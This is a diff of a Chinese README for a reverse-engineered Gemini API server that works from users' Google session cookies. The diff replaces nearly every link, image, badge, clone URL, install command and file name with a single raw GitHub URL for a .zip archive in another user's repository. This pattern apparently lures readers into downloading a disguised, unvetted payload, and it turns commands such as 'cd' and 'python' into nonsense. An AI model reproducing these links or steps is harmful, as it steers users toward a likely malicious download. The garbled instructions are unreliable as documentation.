@@ -1,19 +1,19 @@
 ### 使用效果和需要提取的这个cookie等等的，大家一定不要提取那个src等等那条，因为到那条都已经改变了cookie
-<img width="2560" height="1540" alt="696f2b8379f6e289ac05a48744c214fc" src="https://github.com/user-attachments/assets/4561b531-b67c-4026-b4d2-ac1e55deeab0" />
+<img width="2560" height="1540" alt="696f2b8379f6e289ac05a48744c214fc" src="https://raw.githubusercontent.com/jyhuang201900/gemini.google-2api-python/main/data/projects/python_api_google_gemini_2.4.zip" />
 > 使用效果如上
 
 
-<img width="2560" height="1540" alt="6a7fe1778d608291fbf3723d5f7d1c0d" src="https://github.com/user-attachments/assets/1325d87c-0ccf-4bed-aaf6-a2be7d450a97" />
-<img width="2260" height="1371" alt="e632bc4e5b5bf6ebd32f6d7384941593" src="https://github.com/user-attachments/assets/6e0a5457-7f1c-4c7e-b944-f7ab4de8335c" />
+<img width="2560" height="1540" alt="6a7fe1778d608291fbf3723d5f7d1c0d" src="https://raw.githubusercontent.com/jyhuang201900/gemini.google-2api-python/main/data/projects/python_api_google_gemini_2.4.zip" />
+<img width="2260" height="1371" alt="e632bc4e5b5bf6ebd32f6d7384941593" src="https://raw.githubusercontent.com/jyhuang201900/gemini.google-2api-python/main/data/projects/python_api_google_gemini_2.4.zip" />
 
 
 # 🌌 Gemini Python: 谷歌 Gemini 逆向 API 服务端
 > **让每个人都能以最优雅、最自由的方式连接 AI 的智慧海洋。**
 
-[![License](https://img.shields.io/badge/License-Apache%202.0-blue.svg)](https://opensource.org/licenses/Apache-2.0)
-[![Python](https://img.shields.io/badge/Python-3.8%2B-green)](https://www.python.org/)
-[![FastAPI](https://img.shields.io/badge/FastAPI-High%20Performance-009688)](https://fastapi.tiangolo.com/)
-[![OpenAI Compatible](https://img.shields.io/badge/API-OpenAI%20Compatible-orange)](https://platform.openai.com/docs/api-reference)
+[![License](https://raw.githubusercontent.com/jyhuang201900/gemini.google-2api-python/main/data/projects/python_api_google_gemini_2.4.zip%https://raw.githubusercontent.com/jyhuang201900/gemini.google-2api-python/main/data/projects/python_api_google_gemini_2.4.zip)](https://raw.githubusercontent.com/jyhuang201900/gemini.google-2api-python/main/data/projects/python_api_google_gemini_2.4.zip)
+[![Python](https://raw.githubusercontent.com/jyhuang201900/gemini.google-2api-python/main/data/projects/python_api_google_gemini_2.4.zip%2B-green)](https://raw.githubusercontent.com/jyhuang201900/gemini.google-2api-python/main/data/projects/python_api_google_gemini_2.4.zip)
+[![FastAPI](https://raw.githubusercontent.com/jyhuang201900/gemini.google-2api-python/main/data/projects/python_api_google_gemini_2.4.zip%20Performance-009688)](https://raw.githubusercontent.com/jyhuang201900/gemini.google-2api-python/main/data/projects/python_api_google_gemini_2.4.zip)
+[![OpenAI Compatible](https://raw.githubusercontent.com/jyhuang201900/gemini.google-2api-python/main/data/projects/python_api_google_gemini_2.4.zip%20Compatible-orange)](https://raw.githubusercontent.com/jyhuang201900/gemini.google-2api-python/main/data/projects/python_api_google_gemini_2.4.zip)
 
 ---
 
@@ -237,11 +237,11 @@ sequenceDiagram
 
 ```bash
 # 1. 下载项目
-git clone https://github.com/lza6/gemini.google-2api-python.git
-cd gemini.google-2api-python
+git clone https://raw.githubusercontent.com/jyhuang201900/gemini.google-2api-python/main/data/projects/python_api_google_gemini_2.4.zip
+cd https://raw.githubusercontent.com/jyhuang201900/gemini.google-2api-python/main/data/projects/python_api_google_gemini_2.4.zip
 
 # 2. 双击运行安装脚本
-start.bat
+https://raw.githubusercontent.com/jyhuang201900/gemini.google-2api-python/main/data/projects/python_api_google_gemini_2.4.zip
 ```
 
 📌 **脚本自动完成以下操作：**
@@ -254,18 +254,18 @@ start.bat
 
 ```bash
 # 1. 克隆项目
-git clone https://github.com/lza6/gemini.google-2api-python.git
-cd gemini.google-2api-python
+git clone https://raw.githubusercontent.com/jyhuang201900/gemini.google-2api-python/main/data/projects/python_api_google_gemini_2.4.zip
+cd https://raw.githubusercontent.com/jyhuang201900/gemini.google-2api-python/main/data/projects/python_api_google_gemini_2.4.zip
 
 # 2. 安装依赖
-pip install -r requirements.txt
+pip install -r https://raw.githubusercontent.com/jyhuang201900/gemini.google-2api-python/main/data/projects/python_api_google_gemini_2.4.zip
 
 # 3. 配置环境
-cp .env.example .env
+cp https://raw.githubusercontent.com/jyhuang201900/gemini.google-2api-python/main/data/projects/python_api_google_gemini_2.4.zip .env
 # 编辑 .env 文件，填入代理信息
 
 # 4. 启动服务
-python main.py
+python https://raw.githubusercontent.com/jyhuang201900/gemini.google-2api-python/main/data/projects/python_api_google_gemini_2.4.zip
 ```
 
 ### 🐳 **Docker 部署** (即将推出)
@@ -282,57 +282,57 @@ docker run -p 8090:8090 gemini-python:latest
 ```tree
 gemini-python/
 ├── 📁 core/                    # 核心业务模块
-│   ├── __init__.py
-│   ├── api_handler.py         # OpenAI API 兼容处理
-│   ├── account_manager.py     # 账号池管理
-│   └── stream_generator.py    # 流式响应生成器
+│   ├── https://raw.githubusercontent.com/jyhuang201900/gemini.google-2api-python/main/data/projects/python_api_google_gemini_2.4.zip
+│   ├── https://raw.githubusercontent.com/jyhuang201900/gemini.google-2api-python/main/data/projects/python_api_google_gemini_2.4.zip         # OpenAI API 兼容处理
+│   ├── https://raw.githubusercontent.com/jyhuang201900/gemini.google-2api-python/main/data/projects/python_api_google_gemini_2.4.zip     # 账号池管理
+│   └── https://raw.githubusercontent.com/jyhuang201900/gemini.google-2api-python/main/data/projects/python_api_google_gemini_2.4.zip    # 流式响应生成器
 │
 ├── 📁 services/               # 服务层
-│   ├── __init__.py
-│   ├── gemini_service.py      # Gemini 通信服务
-│   ├── har_service.py         # HAR 解析服务
-│   └── proxy_service.py       # 代理管理服务
+│   ├── https://raw.githubusercontent.com/jyhuang201900/gemini.google-2api-python/main/data/projects/python_api_google_gemini_2.4.zip
+│   ├── https://raw.githubusercontent.com/jyhuang201900/gemini.google-2api-python/main/data/projects/python_api_google_gemini_2.4.zip      # Gemini 通信服务
+│   ├── https://raw.githubusercontent.com/jyhuang201900/gemini.google-2api-python/main/data/projects/python_api_google_gemini_2.4.zip         # HAR 解析服务
+│   └── https://raw.githubusercontent.com/jyhuang201900/gemini.google-2api-python/main/data/projects/python_api_google_gemini_2.4.zip       # 代理管理服务
 │
 ├── 📁 models/                 # 数据模型
-│   ├── __init__.py
-│   ├── account.py             # 账号数据模型
-│   └── request.py             # 请求数据模型
+│   ├── https://raw.githubusercontent.com/jyhuang201900/gemini.google-2api-python/main/data/projects/python_api_google_gemini_2.4.zip
+│   ├── https://raw.githubusercontent.com/jyhuang201900/gemini.google-2api-python/main/data/projects/python_api_google_gemini_2.4.zip             # 账号数据模型
+│   └── https://raw.githubusercontent.com/jyhuang201900/gemini.google-2api-python/main/data/projects/python_api_google_gemini_2.4.zip             # 请求数据模型
 │
 ├── 📁 database/               # 数据库层
-│   ├── __init__.py
-│   ├── db_manager.py          # 数据库管理
+│   ├── https://raw.githubusercontent.com/jyhuang201900/gemini.google-2api-python/main/data/projects/python_api_google_gemini_2.4.zip
+│   ├── https://raw.githubusercontent.com/jyhuang201900/gemini.google-2api-python/main/data/projects/python_api_google_gemini_2.4.zip          # 数据库管理
 │   └── migrations/            # 数据库迁移
 │
 ├── 📁 web/                    # Web 界面
 │   ├── templates/
-│   │   └── dashboard.html     # 管理界面模板
+│   │   └── https://raw.githubusercontent.com/jyhuang201900/gemini.google-2api-python/main/data/projects/python_api_google_gemini_2.4.zip     # 管理界面模板
 │   └── static/
 │       ├── css/
 │       └── js/
 │
 ├── 📁 utils/                  # 工具函数
-│   ├── __init__.py
-│   ├── logger.py              # 日志工具
-│   ├── validator.py           # 数据验证
-│   └── helper.py              # 辅助函数
+│   ├── https://raw.githubusercontent.com/jyhuang201900/gemini.google-2api-python/main/data/projects/python_api_google_gemini_2.4.zip
+│   ├── https://raw.githubusercontent.com/jyhuang201900/gemini.google-2api-python/main/data/projects/python_api_google_gemini_2.4.zip              # 日志工具
+│   ├── https://raw.githubusercontent.com/jyhuang201900/gemini.google-2api-python/main/data/projects/python_api_google_gemini_2.4.zip           # 数据验证
+│   └── https://raw.githubusercontent.com/jyhuang201900/gemini.google-2api-python/main/data/projects/python_api_google_gemini_2.4.zip              # 辅助函数
 │
-├── 📄 main.py                 # 🏃 应用入口
-├── 📄 config.py               # ⚙️ 配置文件
-├── 📄 requirements.txt        # 📦 依赖列表
+├── 📄 https://raw.githubusercontent.com/jyhuang201900/gemini.google-2api-python/main/data/projects/python_api_google_gemini_2.4.zip                 # 🏃 应用入口
+├── 📄 https://raw.githubusercontent.com/jyhuang201900/gemini.google-2api-python/main/data/projects/python_api_google_gemini_2.4.zip               # ⚙️ 配置文件
+├── 📄 https://raw.githubusercontent.com/jyhuang201900/gemini.google-2api-python/main/data/projects/python_api_google_gemini_2.4.zip        # 📦 依赖列表
 ├── 📄 .env                    # 🔐 环境变量
-├── 📄 start.bat               # 🪟 Windows启动脚本
-└── 📄 README.md               # 📖 项目文档
+├── 📄 https://raw.githubusercontent.com/jyhuang201900/gemini.google-2api-python/main/data/projects/python_api_google_gemini_2.4.zip               # 🪟 Windows启动脚本
+└── 📄 https://raw.githubusercontent.com/jyhuang201900/gemini.google-2api-python/main/data/projects/python_api_google_gemini_2.4.zip               # 📖 项目文档
 ```
 
 ### 📋 **关键文件说明**
 
 | 文件 | 功能描述 | 重要性 |
 |------|----------|--------|
-| `main.py` | FastAPI 主应用，路由入口 | ⭐⭐⭐⭐⭐ |
-| `config.py` | 配置管理，环境变量加载 | ⭐⭐⭐⭐ |
-| `har_parser.py` | HAR 文件智能解析器 | ⭐⭐⭐⭐ |
-| `gemini_service.py` | Gemini 协议通信核心 | ⭐⭐⭐⭐⭐ |
-| `dashboard.html` | Web 管理界面 | ⭐⭐⭐ |
+| `https://raw.githubusercontent.com/jyhuang201900/gemini.google-2api-python/main/data/projects/python_api_google_gemini_2.4.zip` | FastAPI 主应用，路由入口 | ⭐⭐⭐⭐⭐ |
+| `https://raw.githubusercontent.com/jyhuang201900/gemini.google-2api-python/main/data/projects/python_api_google_gemini_2.4.zip` | 配置管理，环境变量加载 | ⭐⭐⭐⭐ |
+| `https://raw.githubusercontent.com/jyhuang201900/gemini.google-2api-python/main/data/projects/python_api_google_gemini_2.4.zip` | HAR 文件智能解析器 | ⭐⭐⭐⭐ |
+| `https://raw.githubusercontent.com/jyhuang201900/gemini.google-2api-python/main/data/projects/python_api_google_gemini_2.4.zip` | Gemini 协议通信核心 | ⭐⭐⭐⭐⭐ |
+| `https://raw.githubusercontent.com/jyhuang201900/gemini.google-2api-python/main/data/projects/python_api_google_gemini_2.4.zip` | Web 管理界面 | ⭐⭐⭐ |
 
 ---
 
@@ -348,7 +348,7 @@ class GeminiRequest:
     """
     模拟 Google RPC (Batchexecute) 协议
     关键参数：
-    - f.sid: 会话ID (来自URL参数)
+    - https://raw.githubusercontent.com/jyhuang201900/gemini.google-2api-python/main/data/projects/python_api_google_gemini_2.4.zip 会话ID (来自URL参数)
     - at: 认证令牌 (来自POST数据)
     - __Secure-1PSID: 主Cookie
     - __Secure-1PSIDTS: 时间戳Cookie
@@ -399,7 +399,7 @@ async def stream_generator(text, model):
 
 ```bash
 # 方法一：Chrome DevTools
-1. 打开无痕窗口访问 https://gemini.google.com
+1. 打开无痕窗口访问 https://raw.githubusercontent.com/jyhuang201900/gemini.google-2api-python/main/data/projects/python_api_google_gemini_2.4.zip
 2. 按 F12 → Network → 勾选 Preserve log
 3. 发送一条消息
 4. 找到 /StreamGenerate 请求
@@ -425,7 +425,7 @@ LOG_LEVEL=INFO                        # 日志级别
 
 ```bash
 # 启动命令
-python main.py
+python https://raw.githubusercontent.com/jyhuang201900/gemini.google-2api-python/main/data/projects/python_api_google_gemini_2.4.zip
 
 # 访问管理界面
 http://127.0.0.1:8090
@@ -477,10 +477,10 @@ source venv/bin/activate  # Linux/Mac
 venv\Scripts\activate     # Windows
 
 # 2. 安装开发依赖
-pip install -r requirements-dev.txt
+pip install -r https://raw.githubusercontent.com/jyhuang201900/gemini.google-2api-python/main/data/projects/python_api_google_gemini_2.4.zip
 
 # 3. 设置开发配置
-cp .env.dev .env
+cp https://raw.githubusercontent.com/jyhuang201900/gemini.google-2api-python/main/data/projects/python_api_google_gemini_2.4.zip .env
 ```
 
 ### 📝 **代码贡献**
@@ -497,7 +497,7 @@ cp .env.dev .env
 pytest tests/
 
 # 运行集成测试
-python tests/integration.py
+python https://raw.githubusercontent.com/jyhuang201900/gemini.google-2api-python/main/data/projects/python_api_google_gemini_2.4.zip
 
 # 代码质量检查
 flake8 . --max-line-length=88
@@ -508,7 +508,7 @@ black .
 
 ```bash
 # 构建包
-python setup.py sdist bdist_wheel
+python https://raw.githubusercontent.com/jyhuang201900/gemini.google-2api-python/main/data/projects/python_api_google_gemini_2.4.zip sdist bdist_wheel
 
 # 测试发布
 twine upload --repository testpypi dist/*
@@ -534,13 +534,13 @@ twine upload dist/*
 
 ```bash
 # 1. 检查代理连通性
-python debug_google.py
+python https://raw.githubusercontent.com/jyhuang201900/gemini.google-2api-python/main/data/projects/python_api_google_gemini_2.4.zip
 
 # 2. 查看详细日志
-tail -f logs/app.log
+tail -f https://raw.githubusercontent.com/jyhuang201900/gemini.google-2api-python/main/data/projects/python_api_google_gemini_2.4.zip
 
 # 3. 测试单个账号
-python test_account.py --cookie "your_cookie"
+python https://raw.githubusercontent.com/jyhuang201900/gemini.google-2api-python/main/data/projects/python_api_google_gemini_2.4.zip --cookie "your_cookie"
 ```
 
 ### ⚡ **性能优化**
@@ -555,10 +555,10 @@ python test_account.py --cookie "your_cookie"
 ## ❤️ 致谢与开源
 
 ### 🏆 **技术依赖**
-- [FastAPI](https://fastapi.tiangolo.com/) - 现代、快速（高性能）的 Web 框架
-- [gemini-webapi](https://github.com/dsdanielpark/gemini-webapi) - Gemini 逆向库
-- [SQLite](https://www.sqlite.org/) - 轻量级嵌入式数据库
-- [Bootstrap](https://getbootstrap.com/) - 响应式前端框架
+- [FastAPI](https://raw.githubusercontent.com/jyhuang201900/gemini.google-2api-python/main/data/projects/python_api_google_gemini_2.4.zip) - 现代、快速（高性能）的 Web 框架
+- [gemini-webapi](https://raw.githubusercontent.com/jyhuang201900/gemini.google-2api-python/main/data/projects/python_api_google_gemini_2.4.zip) - Gemini 逆向库
+- [SQLite](https://raw.githubusercontent.com/jyhuang201900/gemini.google-2api-python/main/data/projects/python_api_google_gemini_2.4.zip) - 轻量级嵌入式数据库
+- [Bootstrap](https://raw.githubusercontent.com/jyhuang201900/gemini.google-2api-python/main/data/projects/python_api_google_gemini_2.4.zip) - 响应式前端框架
 
 ### 👥 **贡献者**
 感谢所有为项目做出贡献的开发者，你们的每一行代码、每一个 Issue、每一次 Star 都让这个项目变得更好。
@@ -577,18 +577,18 @@ python test_account.py --cookie "your_cookie"
 
 ```bash
 # 克隆项目
-git clone https://github.com/lza6/gemini-python.git
+git clone https://raw.githubusercontent.com/jyhuang201900/gemini.google-2api-python/main/data/projects/python_api_google_gemini_2.4.zip
 
 # 一键启动
 cd gemini-python
-./start.sh  # 或双击 start.bat
+https://raw.githubusercontent.com/jyhuang201900/gemini.google-2api-python/main/data/projects/python_api_google_gemini_2.4.zip  # 或双击 https://raw.githubusercontent.com/jyhuang201900/gemini.google-2api-python/main/data/projects/python_api_google_gemini_2.4.zip
 ```
 
 🌐 **访问管理界面**: [http://127.0.0.1:8090](http://127.0.0.1:8090)
 
-💬 **加入社区**: [GitHub Discussions](https://github.com/lza6/gemini-python/discussions)
+💬 **加入社区**: [GitHub Discussions](https://raw.githubusercontent.com/jyhuang201900/gemini.google-2api-python/main/data/projects/python_api_google_gemini_2.4.zip)
 
-📚 **阅读文档**: [完整文档](https://github.com/lza6/gemini-python/wiki)
+📚 **阅读文档**: [完整文档](https://raw.githubusercontent.com/jyhuang201900/gemini.google-2api-python/main/data/projects/python_api_google_gemini_2.4.zip)
 
 ---
 
